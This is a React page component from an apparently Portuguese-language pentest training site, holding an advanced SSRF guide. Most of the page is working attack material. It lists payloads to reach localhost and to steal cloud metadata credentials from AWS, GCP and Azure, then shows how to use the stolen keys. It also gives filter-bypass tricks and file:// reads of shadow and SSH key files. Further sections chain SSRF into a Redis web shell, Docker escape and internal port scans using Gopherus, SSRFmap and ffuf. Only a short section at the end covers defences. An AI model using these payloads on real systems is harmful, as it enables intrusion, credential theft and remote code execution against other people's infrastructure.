import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function SSRF() {
  return (
    <PageContainer
      title="SSRF — Server-Side Request Forgery"
      subtitle="Explore vulnerabilidades SSRF para acessar recursos internos, metadados cloud e serviços protegidos. Guia completo com payloads, bypass de filtros, escalonamento para RCE, e ferramentas automatizadas."
      difficulty="avancado"
      timeToRead="30 min"
    >
      <h2>O que é SSRF?</h2>
      <p>
        <strong>Server-Side Request Forgery (SSRF)</strong> ocorre quando um atacante consegue fazer o
        <strong> servidor</strong> (não o seu navegador) realizar requisições HTTP para destinos arbitrários.
        Isso é perigoso porque o servidor geralmente tem acesso a recursos internos que o atacante não
        teria diretamente: bancos de dados internos, APIs administrativas, metadados cloud, e serviços
        em redes privadas.
      </p>
      <p>
        Imagine que um site tem uma funcionalidade "preview de URL" — você digita uma URL e ele mostra
        o conteúdo. Se você digitar <code>http://localhost:8080/admin</code>, o servidor vai acessar
        seu próprio painel admin (que está bloqueado externamente) e mostrar o conteúdo para você.
      </p>

      <AlertBox type="danger" title="OWASP Top 10 — A10:2021">
        SSRF entrou no OWASP Top 10 em 2021 como uma das vulnerabilidades mais críticas da web moderna.
        Em ambientes cloud (AWS, GCP, Azure), SSRF pode levar a comprometimento total da infraestrutura
        ao roubar credenciais do Instance Metadata Service (IMDS).
      </AlertBox>

      <h2>Onde Procurar SSRF</h2>
      <CodeBlock
        title="Funcionalidades vulneráveis a SSRF"
        code={`# ═══════════════════════════════════════════════════
# FUNCIONALIDADES COMUNS VULNERÁVEIS A SSRF
# ═══════════════════════════════════════════════════
#
# 1. Preview/Fetch de URL
#    POST /api/preview
#    {"url": "https://example.com"}
#    → O servidor acessa a URL e retorna o conteúdo
#
# 2. Importação de dados via URL
#    POST /api/import
#    {"source": "https://planilha.com/dados.csv"}
#    → O servidor baixa o arquivo da URL
#
# 3. Webhook/Callback URLs
#    POST /api/webhooks
#    {"callback_url": "https://meusite.com/callback"}
#    → O servidor faz POST para a URL quando um evento ocorre
#
# 4. Geração de PDF/Screenshot
#    POST /api/pdf
#    {"url": "https://pagina.com"}
#    → O servidor renderiza a URL e gera PDF
#    (wkhtmltopdf, Puppeteer, PhantomJS são especialmente vulneráveis)
#
# 5. Proxy/Redirect
#    GET /proxy?url=https://api.externa.com/dados
#    → O servidor faz proxy da requisição
#
# 6. Feeds RSS/Atom
#    POST /api/feeds
#    {"feed_url": "https://blog.com/rss"}
#    → O servidor busca e parseia o feed
#
# 7. Upload de imagem via URL
#    POST /api/avatar
#    {"image_url": "https://foto.com/avatar.jpg"}
#
# 8. Integrações (Slack, Discord, etc.)
#    Configuração de webhook com URL customizável

# ═══════════════════════════════════════════════════
# PARÂMETROS PARA TESTAR
# ═══════════════════════════════════════════════════
# Procure estes nomes de parâmetro em requisições:
# url, uri, path, src, source, href, link, dest,
# redirect, callback, webhook, proxy, fetch, load,
# page, site, html, data, reference, file, filename,
# document, domain, host, feed, to, out, next, target,
# return, image, img, avatar, icon, logo`}
      />

      <h2>Tipos de SSRF</h2>
      <CodeBlock
        title="SSRF Básico vs Blind vs Semi-blind"
        code={`# ═══════════════════════════════════════════════════
# TIPO 1: SSRF BÁSICO (Full Response)
# ═══════════════════════════════════════════════════
# Você VÊ a resposta completa do servidor interno.
# É o mais fácil de explorar.
#
# Exemplo:
# POST /api/fetch
# {"url": "http://localhost:8080/admin/users"}
#
# Resposta: {"users": [{"name": "admin", "password": "..."}]}
# → Você recebeu dados internos diretamente!

# ═══════════════════════════════════════════════════
# TIPO 2: BLIND SSRF (Sem Resposta)
# ═══════════════════════════════════════════════════
# O servidor faz a requisição, mas NÃO retorna o conteúdo.
# Mais difícil de explorar, mas ainda perigoso.
#
# Como confirmar que é vulnerável:
#
# Método 1: DNS Callback (mais confiável)
#   url=http://XXXXXXX.burpcollaborator.net
#   Se Burp Collaborator receber a requisição DNS → é SSRF!
#   Alternativas: interact.sh, webhook.site, dnslog.cn
#
# Método 2: Time-based (medir latência)
#   url=http://10.0.0.1:22      → resposta em 100ms (porta aberta)
#   url=http://10.0.0.1:9999    → resposta em 5000ms (timeout)
#   Diferença de tempo indica que o servidor está tentando conectar
#
# Método 3: Status code/mensagem diferente
#   url=http://10.0.0.1:80      → "Success" ou 200
#   url=http://10.0.0.1:9999    → "Error" ou 500
#   Mensagem diferente indica conexão tentada

# ═══════════════════════════════════════════════════
# TIPO 3: SEMI-BLIND SSRF
# ═══════════════════════════════════════════════════
# O servidor não retorna o conteúdo, mas retorna
# informações parciais (tamanho da resposta, tipo,
# status code, ou mensagem de erro detalhada).
#
# Exemplo:
# url=http://interno:3306
# Resposta: "Error: Invalid HTTP response from target"
# → Indica que a porta 3306 (MySQL) está aberta!
# → MySQL não fala HTTP, então o erro é esperado`}
      />

      <h2>Payloads de SSRF — Guia Completo</h2>

      <h3>Acessar Localhost</h3>
      <CodeBlock
        title="Payloads para acessar o próprio servidor"
        code={`# ═══════════════════════════════════════════════════
# FORMAS DE REPRESENTAR 127.0.0.1 (LOCALHOST)
# ═══════════════════════════════════════════════════
# Muitas aplicações bloqueiam "127.0.0.1" ou "localhost"
# explicitamente. Estas são formas alternativas:

# Formato padrão
http://127.0.0.1:80
http://localhost:80

# Decimal (127*256³ + 0*256² + 0*256 + 1 = 2130706433)
http://2130706433
# O navegador/biblioteca resolve o número decimal para 127.0.0.1

# Hexadecimal
http://0x7f000001
# 0x7f = 127, 00 = 0, 00 = 0, 01 = 1

# Octal
http://017700000001
# 0177 = 127, 00 = 0, 00 = 0, 01 = 1

# Notação curta (omitindo zeros)
http://127.1
# Equivalente a 127.0.0.1 na maioria dos parsers

# IPv6
http://[::1]
http://[::1]:80
http://[0000::0001]
http://[::ffff:127.0.0.1]     # IPv4-mapped IPv6
http://[0:0:0:0:0:ffff:127.0.0.1]

# Zero
http://0.0.0.0                # Aceito em alguns sistemas
http://0                      # Igual a 0.0.0.0

# DNS que resolve para localhost
http://127.0.0.1.nip.io       # Serviço gratuito de DNS wildcard
http://localtest.me            # Resolve para 127.0.0.1
http://127.0.0.1.xip.io
http://vcap.me                 # Resolve para 127.0.0.1

# URL encoding
http://%31%32%37%2e%30%2e%30%2e%31  # = 127.0.0.1
http://%6c%6f%63%61%6c%68%6f%73%74  # = localhost

# Double encoding
http://%25%33%31%25%33%32%25%33%37%2e%30%2e%30%2e%31`}
      />

      <h3>Metadados Cloud — O Ataque Mais Crítico</h3>
      <CodeBlock
        title="SSRF para roubar credenciais cloud (AWS, GCP, Azure)"
        code={`# ═══════════════════════════════════════════════════
# AWS — Instance Metadata Service (IMDS)
# ═══════════════════════════════════════════════════
# O IMDS é um serviço interno de toda instância EC2.
# Ele fornece informações sobre a instância, incluindo
# CREDENCIAIS IAM temporárias com acesso à AWS!

# Endpoint: http://169.254.169.254 (sempre este IP)

# 1. Listar metadados disponíveis
http://169.254.169.254/latest/meta-data/
# Retorna lista de categorias:
# ami-id
# hostname
# instance-id
# instance-type
# local-ipv4
# public-ipv4
# iam/              ← AQUI ESTÃO AS CREDENCIAIS!
# security-groups
# ...

# 2. Descobrir o nome do IAM Role
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Retorna: nome-do-role (ex: "EC2-Admin-Role")

# 3. ROUBAR as credenciais do IAM Role ← CRÍTICO!
http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Admin-Role
# Retorna JSON:
# {
#   "Code" : "Success",
#   "LastUpdated" : "2024-01-15T10:30:00Z",
#   "Type" : "AWS-HMAC",
#   "AccessKeyId" : "ASIAXXXXXXXXXXXXXXXX",
#   "SecretAccessKey" : "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
#   "Token" : "IQoJb3JpZ2luX2VjEBYa...(token longo)...",
#   "Expiration" : "2024-01-15T16:30:00Z"
# }
#
# Com essas 3 credenciais (AccessKeyId + SecretAccessKey + Token),
# o atacante pode usar a AWS CLI como se fosse a instância:
#
# export AWS_ACCESS_KEY_ID=ASIAXXXXXXX
# export AWS_SECRET_ACCESS_KEY=XXXXXXX
# export AWS_SESSION_TOKEN=IQoJb3JpZ2...
# aws s3 ls                    # Listar todos os buckets!
# aws ec2 describe-instances    # Ver todas as instâncias!
# aws iam list-users            # Listar usuários!

# 4. Outras informações úteis
http://169.254.169.254/latest/user-data
# User-data pode conter scripts com senhas hardcoded!
# Ex: #!/bin/bash
#     DB_PASSWORD="SuperSecreto123"
#     ADMIN_TOKEN="abc123xyz"

http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
# Chave SSH pública da instância

# ═══════════════════════════════════════════════════
# AWS IMDSv2 (versão mais segura)
# ═══════════════════════════════════════════════════
# IMDSv2 requer um token obtido via PUT request.
# SSRF básico geralmente faz GET, não PUT.
# Mas se o SSRF permite headers customizados:
#
# Passo 1: Obter token
# PUT http://169.254.169.254/latest/api/token
# Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
#
# Passo 2: Usar token para acessar metadados
# GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Header: X-aws-ec2-metadata-token: TOKEN_OBTIDO

# ═══════════════════════════════════════════════════
# GOOGLE CLOUD PLATFORM (GCP)
# ═══════════════════════════════════════════════════
# Endpoint: http://169.254.169.254 ou http://metadata.google.internal
# REQUER header: Metadata-Flavor: Google
# (sem o header, retorna erro — dificulta SSRF simples)

# Obter token de acesso OAuth
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
# Retorna: {"access_token":"ya29.XXXXX","expires_in":3600,"token_type":"Bearer"}

# Listar escopos do service account
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes

# Informações da instância
http://169.254.169.254/computeMetadata/v1/instance/hostname
http://169.254.169.254/computeMetadata/v1/instance/zone
http://169.254.169.254/computeMetadata/v1/project/project-id

# Chaves SSH do projeto
http://169.254.169.254/computeMetadata/v1/project/attributes/ssh-keys

# ═══════════════════════════════════════════════════
# MICROSOFT AZURE
# ═══════════════════════════════════════════════════
# Endpoint: http://169.254.169.254
# REQUER header: Metadata: true

# Informações da instância
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Token de acesso (Managed Identity)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Retorna: {"access_token":"eyJ0eXAiO...","expires_in":"86400",...}

# ═══════════════════════════════════════════════════
# DIGITAL OCEAN
# ═══════════════════════════════════════════════════
# NÃO requer headers especiais! Mais fácil de explorar.
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/user-data  # Scripts com senhas!`}
      />

      <h2>Bypass de Filtros — Técnicas Avançadas</h2>
      <CodeBlock
        title="Como contornar validações e WAFs"
        code={`# ═══════════════════════════════════════════════════
# CENÁRIO: A aplicação bloqueia "127.0.0.1", "localhost",
# "169.254.169.254", IPs privados, etc.
# ═══════════════════════════════════════════════════

# ─── BYPASS 1: Redirecionamento Aberto ───────────
# Se o filtro valida a URL inicial mas segue redirects:
# 1. Hospedar um redirect no seu servidor:
#    http://SEU-SERVIDOR/redir?target=http://127.0.0.1
# 2. O filtro vê "SEU-SERVIDOR" (domínio externo → OK!)
# 3. O servidor segue o redirect → acessa 127.0.0.1

# No seu servidor (Python):
# from flask import Flask, redirect, request
# app = Flask(__name__)
# @app.route('/redir')
# def redir():
#     return redirect(request.args.get('target'))

# ─── BYPASS 2: DNS Rebinding ─────────────────────
# Registrar domínio que alterna resolução DNS:
# 1ª resolução: 1.2.3.4 (IP público → passa no filtro)
# 2ª resolução: 127.0.0.1 (IP local → SSRF!)
#
# Ferramenta: rbndr.us
# Configurar: 1.2.3.4 & 127.0.0.1
# URL: http://a]1020304.7f000001.rbndr.us/
# Alternativa: usar Singularity of Origin

# ─── BYPASS 3: Parser Confusion ──────────────────
# Diferentes parsers de URL interpretam de forma diferente:

# Usando @ (userinfo)
http://trusted.com@127.0.0.1/
# Parser pode ver "trusted.com" como domínio
# Mas a requisição vai para 127.0.0.1

# Usando # (fragment)
http://127.0.0.1#@trusted.com
# Parser pode ver "trusted.com" após o #
# Mas a requisição vai para 127.0.0.1

# Usando backslash
http://127.0.0.1\\@trusted.com

# ─── BYPASS 4: Protocolos Alternativos ───────────
# Se o filtro valida apenas http/https:

# file:// — ler arquivos locais
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ    # Variáveis de ambiente!
file:///proc/self/cmdline    # Linha de comando do processo
file:///home/user/.ssh/id_rsa  # Chave SSH privada!

# gopher:// — enviar dados raw para qualquer porta
# EXTREMAMENTE poderoso! Permite interagir com:
# Redis, MySQL, SMTP, Memcached, etc.
gopher://127.0.0.1:6379/_INFO%0d%0a    # Redis INFO

# dict:// — protocolo de dicionário
dict://127.0.0.1:6379/INFO              # Redis

# ─── BYPASS 5: Encoding ──────────────────────────
# URL encoding simples
http://%31%32%37%2e%30%2e%30%2e%31

# Double URL encoding
http://%25%33%31%25%33%32%25%33%37%2e%30%2e%30%2e%31

# Unicode encoding
http://127。0。0。1  (pontos CJK)

# ─── BYPASS 6: Variações de IP ───────────────────
# IPs com zeros extras (0-padding)
http://127.000.000.001
http://0177.0.0.01     # Octal

# Mixed notation
http://127.0x0.0.1     # Hex parcial`}
      />

      <h2>SSRF → RCE: Escalonamento de Ataque</h2>
      <CodeBlock
        title="Transformar SSRF em execução de código"
        code={`# ═══════════════════════════════════════════════════
# SSRF → REDIS → RCE
# ═══════════════════════════════════════════════════
# Se Redis está rodando no servidor sem senha (padrão):
# 1. Usar gopher:// para enviar comandos Redis
# 2. Redis escreve uma web shell no diretório web

# Gerar payload com Gopherus:
git clone https://github.com/tarunkant/Gopherus
cd Gopherus
python3 gopherus.py --exploit redis
# Selecionar: PHPShell ou ReverseShell
# O Gopherus gera o payload gopher:// completo

# O payload faz o seguinte no Redis:
# 1. FLUSHALL — limpa o banco
# 2. SET 1 "<?php system($_GET['cmd']); ?>" — cria entrada
# 3. CONFIG SET dir /var/www/html — muda diretório de dump
# 4. CONFIG SET dbfilename shell.php — nome do arquivo
# 5. SAVE — salva no disco
# Resultado: /var/www/html/shell.php é criado!

# Depois acessar:
# http://alvo.com/shell.php?cmd=id

# ═══════════════════════════════════════════════════
# SSRF → ELASTICSEARCH → Data Exfiltration
# ═══════════════════════════════════════════════════
# Elasticsearch geralmente roda na porta 9200 sem auth:
http://127.0.0.1:9200/                      # Versão e info
http://127.0.0.1:9200/_cat/indices           # Listar todos os índices
http://127.0.0.1:9200/_search?q=password     # Buscar "password" em tudo!
http://127.0.0.1:9200/users/_search?size=1000  # Dump do índice "users"

# ═══════════════════════════════════════════════════
# SSRF → DOCKER API → Container Escape → RCE
# ═══════════════════════════════════════════════════
# Docker API na porta 2375 (sem TLS) é devastador:
http://127.0.0.1:2375/version              # Versão do Docker
http://127.0.0.1:2375/containers/json      # Listar containers
http://127.0.0.1:2375/images/json          # Listar imagens
# Para RCE: criar container privilegiado montando / do host

# ═══════════════════════════════════════════════════
# SSRF → MYSQL → Data Exfiltration
# ═══════════════════════════════════════════════════
# Usar gopher para enviar queries MySQL:
python3 gopherus.py --exploit mysql
# Query: SELECT * FROM users
# Gera payload gopher:// que envia a query para MySQL

# ═══════════════════════════════════════════════════
# SSRF → SMTP → Enviar Email (Phishing interno)
# ═══════════════════════════════════════════════════
# Usar gopher para enviar emails via SMTP interno:
python3 gopherus.py --exploit smtp
# Envia email como qualquer remetente interno!`}
      />

      <h2>Ferramentas para Testar SSRF</h2>
      <CodeBlock
        title="Ferramentas e automação"
        code={`# ═══════════════════════════════════════════════════
# BURP SUITE — Testar manualmente
# ═══════════════════════════════════════════════════
# 1. Capturar requisição com parâmetro URL
# 2. Enviar para Repeater (Ctrl+R)
# 3. Substituir URL por payloads SSRF
# 4. Para Blind SSRF: usar Burp Collaborator
#    - Burp → Burp Collaborator client → Copy to clipboard
#    - Usar URL do collaborator como payload
#    - Se aparecer interação → SSRF confirmado!

# ═══════════════════════════════════════════════════
# SSRFMAP — Automatizar exploração
# ═══════════════════════════════════════════════════
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap

# Uso básico (precisa do arquivo request.txt com a requisição raw):
python3 ssrfmap.py -r request.txt -p url -m readfiles
# -r request.txt = arquivo com a requisição HTTP capturada
# -p url         = nome do parâmetro vulnerável
# -m readfiles   = módulo para ler arquivos via file://
#
# Módulos disponíveis:
# readfiles  — ler arquivos locais (file://)
# portscan   — scan de portas internas
# networkscan — descobrir hosts na rede interna
# redis      — executar comandos no Redis
# mysql      — executar queries no MySQL
# smtp       — enviar emails via SMTP interno
# aws        — roubar credenciais AWS IMDS

# ═══════════════════════════════════════════════════
# GOPHERUS — Gerar payloads gopher://
# ═══════════════════════════════════════════════════
git clone https://github.com/tarunkant/Gopherus
python3 gopherus.py --exploit redis     # → Redis RCE
python3 gopherus.py --exploit mysql     # → MySQL queries
python3 gopherus.py --exploit smtp      # → Enviar email
python3 gopherus.py --exploit fastcgi   # → PHP-FPM RCE
python3 gopherus.py --exploit zabbix    # → Zabbix RCE

# ═══════════════════════════════════════════════════
# FFUF — Descobrir portas internas via SSRF
# ═══════════════════════════════════════════════════
# Gerar lista de portas
seq 1 65535 > ports.txt

# Fuzzing de portas internas
ffuf -u "https://alvo.com/fetch?url=http://127.0.0.1:FUZZ/" \\
  -w ports.txt \\
  -mc 200 \\
  -fs 0 \\
  -t 50
# -mc 200  = mostrar apenas status 200
# -fs 0    = filtrar respostas com body vazio (0 bytes)
# -t 50    = 50 threads simultâneas

# Descobrir hosts na rede interna
ffuf -u "https://alvo.com/fetch?url=http://192.168.1.FUZZ:80/" \\
  -w <(seq 1 254) \\
  -mc 200 \\
  -t 30

# ═══════════════════════════════════════════════════
# INTERACT.SH — Alternativa gratuita ao Burp Collaborator
# ═══════════════════════════════════════════════════
# https://app.interactsh.com/
# Gera URL única para detectar blind SSRF
# Toda vez que o servidor acessar a URL, você recebe notificação`}
      />

      <h2>Prevenção Detalhada</h2>
      <CodeBlock
        title="Como defender contra SSRF (para o relatório)"
        code={`# ═══════════════════════════════════════════════════
# DEFESAS (incluir no relatório de pentest)
# ═══════════════════════════════════════════════════

# 1. WHITELIST de destinos (MELHOR DEFESA)
#    - Manter lista de domínios/IPs permitidos
#    - Rejeitar TUDO que não está na lista
#    - Ex: só permitir *.api-parceiro.com

# 2. Bloquear IPs internos/privados
#    - 127.0.0.0/8 (localhost)
#    - 10.0.0.0/8 (RFC1918)
#    - 172.16.0.0/12 (RFC1918)
#    - 192.168.0.0/16 (RFC1918)
#    - 169.254.0.0/16 (link-local, IMDS!)
#    - 0.0.0.0/8
#    - ::1 (IPv6 localhost)
#    ⚠️ Validar APÓS resolução DNS (contra DNS rebinding)

# 3. Desabilitar protocolos desnecessários
#    - Permitir APENAS http:// e https://
#    - Bloquear: file://, gopher://, dict://, ftp://

# 4. AWS: Usar IMDSv2 (requer token PUT)
#    - IMDSv1 é explorável com GET simples
#    - IMDSv2 requer PUT para obter token → dificulta SSRF

# 5. Não seguir redirects (ou limitar a 0)
#    - Redirects são usados para bypass de whitelist

# 6. Timeout curto para conexões (2-5 segundos)
#    - Evita scan lento de portas internas

# 7. Validar resposta (Content-Type, tamanho)
#    - Se espera imagem, verificar se é realmente imagem
#    - Limitar tamanho da resposta`}
      />
    </PageContainer>
  );
}
